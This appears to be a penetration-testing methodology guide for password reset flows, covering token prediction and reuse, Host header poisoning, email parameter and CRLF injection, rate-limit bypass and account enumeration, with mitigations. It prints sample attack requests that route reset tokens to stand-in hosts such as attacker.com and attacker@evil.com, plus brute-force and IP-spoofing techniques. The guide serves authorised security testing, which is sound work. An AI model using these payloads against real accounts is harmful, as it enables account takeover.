<password_reset_vulnerabilities_guide>
<title>PASSWORD RESET VULNERABILITIES</title>

<critical>Password reset flows are high-value targets combining authentication bypass, account takeover, and information disclosure. Focus on token prediction, token reuse, Host header poisoning, rate limiting bypass, and email parameter injection. A single flaw enables full account compromise.</critical>

<scope>
- Token prediction and entropy analysis
- Token reuse and lack of invalidation
- Host header poisoning in reset emails
- Rate limiting bypass techniques
- Email parameter injection (multiple recipients)
- Account enumeration via reset flow
- Password reset link hijacking
- Token expiration weaknesses
- Password reset without old password
</scope>

<methodology>
1. Trigger reset flow: identify all reset endpoints (forgot password, email change, account recovery)
2. Analyze token: length, character set, predictability, entropy
3. Test reuse: use same token multiple times, for different accounts
4. Test invalidation: check if token expires after use, password change, logout
5. Manipulate email delivery: Host header, email parameter array
6. Test rate limits: automated reset requests, response timing
7. Enumerate accounts: differential responses for valid vs invalid emails
8. Test link hijacking: Referer leakage, token in HTTP vs HTTPS
</methodology>

<token_vulnerabilities>
<weak_entropy>
- Short tokens: 4-6 digits easily brute forced
- Sequential: incrementing integers, timestamps
- Predictable: MD5(email), hash of known value
- Insufficient randomness: Math.random(), time-based seeds

Analysis:
1. Collect multiple tokens for same/different accounts
2. Analyze pattern: length, character set, distribution
3. Calculate entropy: bits of randomness
4. Test prediction: generate candidate tokens and test
5. Time-based: if token contains timestamp, predict future tokens

Example weak token:
- 123456 (6 digits = 10^6 = ~20 bits, brute forceable)
- base64(md5(email)) (predictable if email known)
- unix_timestamp + user_id (both predictable)
</weak_entropy>

<token_reuse>
- Use same token multiple times
- Token not invalidated after first use
- Token valid for multiple password changes

Test:
POST /reset-password
{
  "token": "abc123",
  "newPassword": "password1"
}
// Success: password changed

POST /reset-password
{
  "token": "abc123",  // same token again
  "newPassword": "password2"
}
// Success again → token reusable
</token_reuse>

<no_invalidation>
- Token remains valid after:
  - Successful password change
  - User logs out
  - User triggers new reset (old token still valid)
  - Account locked/disabled
- Long expiration: 24-72 hours or never

Impact: attacker with old token can reset password anytime
</no_invalidation>

<token_leakage>
- Token in URL query parameter (GET request)
- Logged in web server access logs
- Leaked via Referer header
- HTTP (not HTTPS): sniffable on network
- Cached by browser, proxy, CDN

Example:
https://example.com/reset?token=secret123
User clicks link, visits attacker site, Referer header leaks token
</token_leakage>
</token_vulnerabilities>

<host_header_poisoning>
<attack_vector>
- Reset email contains link with Host header value
- Attacker controls Host header in reset request
- Email sent with attacker's domain in link
- Victim clicks link → token sent to attacker

POST /forgot-password
Host: attacker.com
Content-Type: application/json
{
  "email": "victim@example.com"
}

Email received:
"Click here to reset: http://attacker.com/reset?token=abc123"
Victim clicks → attacker logs token from server logs
</attack_vector>

<variations>
- X-Forwarded-Host: attacker.com
- X-Original-Host: attacker.com
- X-Host: attacker.com
- Host: legit.com:@attacker.com (parser confusion)
- Host: legit.com\r\nInjected-Header: value

Test multiple headers, check email link domain
</variations>

<validation>
1. Send reset request with Host: attacker.com
2. Check email received (use your own email for testing)
3. Inspect link domain: should be attacker.com if vulnerable
4. Click link, verify token sent to attacker server
5. Use token to reset victim password
</validation>
</host_header_poisoning>

<rate_limiting_bypass>
<no_rate_limit>
- Unlimited reset requests for same email
- Enables brute force of weak tokens
- Email flooding DoS
- Verification code brute force (6-digit codes)

Test:
for i in range(1000):
    requests.post('/forgot-password', json={'email': 'target@example.com'})
// If all succeed: no rate limit
</no_rate_limit>

<bypass_techniques>
- IP rotation: use proxies, VPNs, Tor
- X-Forwarded-For spoofing: change apparent IP
- User-Agent randomization: appear as different client
- Email case variation: Target@example.com, target@example.com
- Email comment injection: victim+comment@example.com
- Email subdomain: victim@sub.example.com
- Unicode normalization: vıctim@example.com (dotless i)
</bypass_techniques>

<validation_code_brute>
- 6-digit code: 000000 to 999999 (1M combinations)
- 4-digit code: 0000 to 9999 (10K combinations)
- With no rate limit: automate brute force
- Time-based expiry: race against 15-30 minute window
</validation_code_brute>
</rate_limiting_bypass>

<email_parameter_injection>
<multiple_recipients>
- Email parameter accepts array
- Send reset to victim + attacker

POST /forgot-password
{
  "email": ["victim@example.com", "attacker@evil.com"]
}

Result: both emails receive reset link with same/different tokens
If same token: attacker has victim's reset token
</multiple_recipients>

<cc_bcc_injection>
- CRLF injection in email parameter
- Inject Cc: or Bcc: headers

POST /forgot-password
{
  "email": "victim@example.com%0ACc: attacker@evil.com"
}

Email sent with Cc to attacker
</cc_bcc_injection>

<email_parameter_pollution>
- Send multiple email parameters
email=victim@example.com&email=attacker@evil.com

Backend may use second value for sending but first for logging
</email_parameter_pollution>
</email_parameter_injection>

<account_enumeration>
<timing_differences>
- Measure response time for valid vs invalid emails
- Valid email: generate token, send email (slower)
- Invalid email: immediate response (faster)

Measure:
valid_time = time_request('victim@example.com')
invalid_time = time_request('notexist@example.com')
if valid_time > invalid_time + 100ms: enumerable
</timing_differences>

<response_differences>
- Status codes: 200 for valid, 404 for invalid
- Error messages: "Email sent" vs "Email not found"
- Response body length differences
- Different headers: Set-Cookie only for valid

Mitigation bypass:
Even with same response, timing may leak information
</response_differences>

<email_delivery_confirmation>
- "If email exists, you'll receive a link"
- But: email delivery observable via traffic analysis
- SMTP logs, email gateway logs
- Side-channel: check spam folder, email rules triggered
</email_delivery_confirmation>
</account_enumeration>

<link_hijacking>
<referer_leakage>
- Reset link clicked, user navigates to external site
- Referer header contains token:
  Referer: https://example.com/reset?token=secret123

Attacker embeds: <img src="https://attacker.com/log">
Browser sends Referer with token to attacker.com
</referer_leakage>

<http_downgrade>
- Reset link uses HTTP (not HTTPS)
- Token transmitted in plaintext
- MITM can intercept token
- Proxy, public WiFi, ISP can log

Test: check email for http:// vs https://
</http_downgrade>

<token_in_url>
- Token in URL fragment (#) safer: not sent to server
- Token in query (?) less safe: logged, sent in Referer
- POST-based reset safer: token in body

Best practice: use POST with token in body, not URL
</token_in_url>
</link_hijacking>

<password_change_without_verification>
<no_old_password_required>
- Logged-in user can change password without entering old password
- Attacker with temporary session access changes password permanently

POST /change-password
{
  "newPassword": "attacker-password"
}
// Success without oldPassword field
</no_old_password_required>

<session_fixation>
- Attacker sets victim's session cookie
- Victim resets password, session remains valid
- Attacker still logged in with same session

Mitigation: invalidate all sessions on password change
</session_fixation>
</password_change_without_verification>

<validation>
1. Token analysis: collect tokens, calculate entropy, test prediction
2. Reuse test: use same token multiple times, verify not invalidated
3. Host header: send with Host: attacker.com, check email link
4. Rate limit: send 100+ requests, verify throttling
5. Email injection: test array, CRLF, parameter pollution
6. Enumeration: compare responses/timing for valid vs invalid emails
7. Link security: check HTTP vs HTTPS, token in URL vs body
8. Impact: demonstrate successful account takeover
</validation>

<false_positives>
- High entropy tokens (not predictable)
- Tokens properly invalidated after use
- Strong rate limiting (temporary blocks)
- Generic responses hiding enumeration
- HTTPS with token in POST body (secure)
</false_positives>

<impact>
- Full account takeover (change password without authorization)
- Mass account compromise (via token prediction or brute force)
- Account enumeration (user database mapping)
- Email flooding DoS
- Phishing via poisoned reset links
- Session persistence after password change
</impact>

<pro_tips>
1. Test token entropy: collect 10+ tokens, analyze pattern
2. Check email source: view raw email for full headers and links
3. Always test Host header injection: high impact, often overlooked
4. Rate limiting: test from multiple IPs to confirm global vs per-IP
5. Email parameter: try arrays, objects, strings with special characters
6. Timing attacks: use median of multiple requests for accuracy
7. Test all password reset endpoints: forgot password, email change, 2FA recovery
8. Check if old password required for logged-in password change
9. Verify all sessions invalidated after password change
10. Test token expiration: wait 24 hours, test if still valid
11. Check token format: JWT may leak user info, sequential integers predictable
12. Test on mobile apps: may use different endpoint with different vulnerabilities
</pro_tips>

<remember>Password reset is authentication bypass with user cooperation. Secure implementation requires high-entropy tokens, single-use with short expiration, rate limiting, account enumeration prevention, Host header validation, and session invalidation on password change. Any weakness enables account takeover.</remember>
</password_reset_vulnerabilities_guide>
